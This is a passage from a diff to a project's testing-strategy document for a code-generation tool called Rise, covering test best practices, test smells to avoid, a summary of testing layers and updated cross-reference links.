+5. **Mock external dependencies**: Don't call real APIs
+6. **Update tests with code**: Tests are documentation
+
+### Test Smells to Avoid
+
+❌ **Flaky tests**: Randomly pass/fail
+❌ **Slow tests**: Take > 5 seconds
+❌ **Brittle tests**: Break with minor changes
+❌ **Obscure tests**: Hard to understand what's tested
+❌ **Duplicate tests**: Testing same thing multiple ways
+
+---
+
+## Conclusion
+
+This testing strategy ensures Rise delivers reliable, secure, and high-quality code generation. The multi-layered approach catches bugs at every level:
+
+- **Unit tests**: Catch logic errors early
+- **Integration tests**: Verify components work together
+- **E2E tests**: Ensure user workflows function
+- **Security tests**: Prevent vulnerabilities
+- **Generated code tests**: Guarantee quality output
+
+**Critical**: All tests must pass before merging to main. No exceptions.
 
 ---
 
 **See Also**:
-- [Security Model](./SECURITY.md) - Security testing requirements
-- [MVP Roadmap](./MVP_ROADMAP.md) - Testing implementation timeline
-- [Examples](./EXAMPLES.md) - Test data and scenarios
+- [SECURITY_SPEC.md](./SECURITY_SPEC.md) - Security testing requirements
+- [MVP_ROADMAP.md](./MVP_ROADMAP.md) - Testing timeline
+- [COMPONENT_SCHEMA.md](./COMPONENT_SCHEMA.md) - Schema to test against
+
+---
+
+**Last Updated**: October 25, 2025  
+**Status**: ✅ Complete - Ready for Implementation  
+**Review Required**: QA Lead & Senior Developer
